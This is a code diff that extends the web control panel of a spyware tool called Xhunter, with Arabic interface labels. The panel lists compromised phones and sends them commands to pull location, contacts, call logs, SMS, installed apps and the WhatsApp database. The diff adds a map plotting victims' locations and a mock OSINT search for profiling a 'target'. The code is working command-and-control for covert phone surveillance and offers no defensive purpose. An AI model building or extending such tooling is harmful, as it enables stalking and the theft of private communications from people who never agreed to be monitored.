@@ -3,29 +3,71 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة تحكم Xhunter</title>
-<link rel="stylesheet" href="style.css">
+<title>لوحة تحكم Xhunter + OSINT</title>
+
+<!-- Leaflet for map -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+
+<style>
+body { font-family: Arial, sans-serif; background:#071021; color:#bfffe8; margin:0; padding:0; }
+header { background:#001219; padding:20px; text-align:center; box-shadow:0 2px 5px #000; }
+header h1 { margin:0; font-size:28px; color:#00ffcc; }
+header span { color:#f3f3f3; }
+.topbar { display:flex; justify-content:center; background:#002233; }
+.topbar button { padding:12px 20px; background:none; border:none; color:#bfffe8; cursor:pointer; font-weight:bold; }
+.topbar button.active { background:#00ffcc; color:#001219; border-radius:5px; }
+main { padding:15px; }
+.panel { display:none; }
+.panel.active { display:block; }
+#devices .device { background:#001f2d; margin:10px 0; padding:10px; border-radius:8px; box-shadow:0 2px 5px #000; }
+#devices button { margin:5px 3px; padding:6px 10px; background:#00ffcc; color:#001219; border:none; border-radius:5px; cursor:pointer; }
+#logs { max-height:300px; overflow:auto; padding:5px; border:1px solid #00ffcc; border-radius:5px; background:#001219; }
+#logs div { margin:4px 0; }
+#map { height:400px; width:100%; margin-top:10px; border:2px solid #00ffcc; border-radius:8px; }
+#osintResults { max-height:400px; overflow:auto; background:#001219; padding:10px; border-radius:8px; border:2px solid #00ffcc; }
+select, input, button { margin:5px; padding:6px; border-radius:5px; border:none; }
+select, input { background:#001219; color:#bfffe8; }
+button#sendCommand, button#osintSearchBtn { background:#00ffcc; color:#001219; font-weight:bold; cursor:pointer; }
+.osint-entry { margin-bottom:10px; padding:5px; border-bottom:1px solid #00ffcc; }
+</style>
+
 <script src="/socket.io/socket.io.js"></script>
 </head>
+
 <body>
-<header><h1>نظام استخبارات <span>Xhunter</span></h1></header>
+<header>
+  <h1>نظام استخبارات <span>Xhunter + OSINT</span></h1>
+</header>
+
 <nav class="topbar">
   <button data-tab="devices" class="tab active">الأجهزة</button>
+  <button data-tab="map" class="tab">الخريطة</button>
   <button data-tab="logs" class="tab">السجل</button>
   <button data-tab="commands" class="tab">الأوامر</button>
+  <button data-tab="osint" class="tab">جمع معلومات الهدف</button>
 </nav>
 
 <main>
+  <!-- تبويب الأجهزة -->
   <section id="tab-devices" class="panel active">
     <h2>الأجهزة المتصلة</h2>
     <div id="devices"></div>
   </section>
 
+  <!-- تبويب الخريطة -->
+  <section id="tab-map" class="panel">
+    <h2>الخريطة الاستخباراتية</h2>
+    <div id="map"></div>
+  </section>
+
+  <!-- تبويب السجل -->
   <section id="tab-logs" class="panel">
     <h2>السجل</h2>
     <div id="logs"></div>
   </section>
 
+  <!-- تبويب الأوامر -->
   <section id="tab-commands" class="panel">
     <h2>إصدار أوامر</h2>
     <select id="deviceSelect"></select>
@@ -38,10 +80,176 @@
       <option value="getExtraData">بيانات إضافية</option>
       <option value="downloadWhatsappDatabase">واتساب</option>
     </select>
+    <input id="commandData" placeholder='بيانات JSON (اختياري)'>
     <button id="sendCommand">إرسال</button>
+  </section>
+
+  <!-- تبويب OSINT -->
+  <section id="tab-osint" class="panel">
+    <h2>جمع معلومات عن الهدف</h2>
+    <input type="text" id="osintInput" placeholder="اسم، بريد، أو رقم هدف">
+    <button id="osintSearchBtn">بحث</button>
+    <div id="osintResults"></div>
   </section>
 </main>
 
-<script src="app.js"></script>
+<script>
+const socket = io();
+socket.emit('adminJoin');
+
+const devicesDiv = document.getElementById('devices');
+const logsDiv = document.getElementById('logs');
+const deviceSelect = document.getElementById('deviceSelect');
+const commandActionEl = document.getElementById('commandAction');
+const commandDataEl = document.getElementById('commandData');
+const sendCommandBtn = document.getElementById('sendCommand');
+const osintInput = document.getElementById('osintInput');
+const osintResults = document.getElementById('osintResults');
+const osintSearchBtn = document.getElementById('osintSearchBtn');
+
+const devicesMap = {}; 
+let map, markers = {};
+
+// تبديل التبويبات
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.addEventListener('click', ()=>{
+    document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+    tab.classList.add('active');
+    document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+    document.getElementById('tab-'+tab.dataset.tab).classList.add('active');
+    if(tab.dataset.tab==='map') initMap();
+  });
+});
+
+// خريطة Leaflet
+function initMap(){
+  if(map) return;
+  map = L.map('map').setView([15.5,44],6);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+    attribution:'&copy; OpenStreetMap contributors'
+  }).addTo(map);
+}
+initMap();
+
+// عرض الأجهزة
+function renderDevice(device){
+  let d = devicesMap[device.id];
+  if(!d){
+    d = document.createElement('div');
+    d.className = 'device';
+    d.id = 'device_' + device.id;
+    d.innerHTML = `
+      <strong>${device.id}</strong> - ${device.model} - IP: ${device.ip}
+      <div>المنصة: ${device.platform || 'N/A'}</div>
+      <div>اللغة: ${device.language || 'N/A'}</div>
+      <div>شاشة: ${device.screen ? device.screen.width+'x'+device.screen.height : 'N/A'}</div>
+      <div id="extra_${device.id}"></div>
+      <button onclick="requestLocation('${device.id}')">طلب الموقع</button>
+      <button onclick="requestApps('${device.id}')">تطبيقات مثبتة</button>
+      <button onclick="requestContacts('${device.id}')">جهات الاتصال</button>
+      <button onclick="requestCallLog('${device.id}')">سجل المكالمات</button>
+      <button onclick="requestSMS('${device.id}')">الرسائل</button>
+      <button onclick="requestWhatsappDB('${device.id}')">واتساب</button>
+    `;
+    devicesDiv.appendChild(d);
+    devicesMap[device.id] = d;
+
+    const opt = document.createElement('option');
+    opt.value = device.id;
+    opt.textContent = device.id + ' (' + (device.model || 'N/A') + ')';
+    deviceSelect.appendChild(opt);
+  }
+
+  if(device.lastLocation && device.lastLocation.lat && device.lastLocation.lon){
+    initMap();
+    if(markers[device.id]){
+      markers[device.id].setLatLng([device.lastLocation.lat, device.lastLocation.lon]);
+    } else {
+      markers[device.id] = L.marker([device.lastLocation.lat, device.lastLocation.lon])
+        .addTo(map)
+        .bindPopup(`<b>${device.id}</b><br>${device.lastLocation.address || ''}`);
+    }
+  }
+}
+
+// إضافة سجل
+function addLog(msg){
+  const log = document.createElement('div');
+  log.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+  logsDiv.appendChild(log);
+  logsDiv.scrollTop = logsDiv.scrollHeight;
+}
+
+// استقبال الأجهزة
+socket.on('join', device => {
+  renderDevice(device);
+  addLog(`جهاز متصل: ${device.id}`);
+});
+
+// الردود على الطلبات
+socket.on('requestResult', payload=>{
+  try{
+    const obj = JSON.parse(payload);
+    addLog(`Request ${obj.action} -> ${obj.to}: ${obj.ok ? 'نجاح' : obj.reason || 'فشل'}`);
+    const extraDiv = document.getElementById('extra_' + obj.to);
+    if(obj.ok && obj.result){
+      switch(obj.action){
+        case 'getLocation':
+          extraDiv.innerHTML = `موقع: ${obj.result.data.lat}, ${obj.result.data.lon}<br>العنوان: ${obj.result.data.address || 'N/A'}`;
+          renderDevice({id:obj.to,lastLocation:obj.result.data});
+          break;
+        default:
+          extraDiv.innerHTML = JSON.stringify(obj.result.data).slice(0,200)+'...';
+      }
+    }
+  }catch(e){ console.error(e); }
+});
+
+// إرسال أوامر
+sendCommandBtn.addEventListener('click', ()=>{
+  const to = deviceSelect.value;
+  const action = commandActionEl.value;
+  let data = null;
+  if(commandDataEl.value.trim()){
+    try{ data = JSON.parse(commandDataEl.value.trim()); }
+    catch(e){ alert('JSON غير صالح'); return; }
+  }
+  if(!to){ alert('اختر جهازاً'); return; }
+  socket.emit('request', { to, action, data });
+  addLog(`أرسل الأمر: ${action} → ${to}`);
+});
+
+// أوامر مباشرة
+function requestLocation(id){ socket.emit('request',{to:id,action:'getLocation'}); }
+function requestApps(id){ socket.emit('request',{to:id,action:'getInstalledApps'}); }
+function requestContacts(id){ socket.emit('request',{to:id,action:'getContacts'}); }
+function requestCallLog(id){ socket.emit('request',{to:id,action:'getCallLog'}); }
+function requestSMS(id){ socket.emit('request',{to:id,action:'getSMS'}); }
+function requestWhatsappDB(id){ socket.emit('request',{to:id,action:'downloadWhatsappDatabase'}); }
+
+// OSINT - بحث عن الهدف (محاكاة: يمكن ربط API خارجي لاحقاً)
+osintSearchBtn.addEventListener('click', ()=>{
+  const query = osintInput.value.trim();
+  if(!query){ alert('أدخل اسم أو بريد أو رقم'); return; }
+  osintResults.innerHTML = '<div>جاري البحث...</div>';
+
+  // محاكاة جمع معلومات من الإنترنت
+  setTimeout(()=>{
+    osintResults.innerHTML = '';
+    const fakeData = [
+      {source:'Google', result:`وجدنا 3 روابط مرتبطة بـ "${query}"`},
+      {source:'LinkedIn', result:`ملف شخصي محتمل باسم "${query}"`},
+      {source:'Twitter', result:`حساب تويتر محتمل باسم @${query.replace(/\s/g,'')}`},
+      {source:'EmailLeakDB', result:`تم العثور على تسرب بريد محتمل: ${query}@example.com`}
+    ];
+    fakeData.forEach(d=>{
+      const div = document.createElement('div');
+      div.className='osint-entry';
+      div.innerHTML=`<b>${d.source}:</b> ${d.result}`;
+      osintResults.appendChild(div);
+    });
+  },1500);
+});
+</script>
 </body>
 </html>
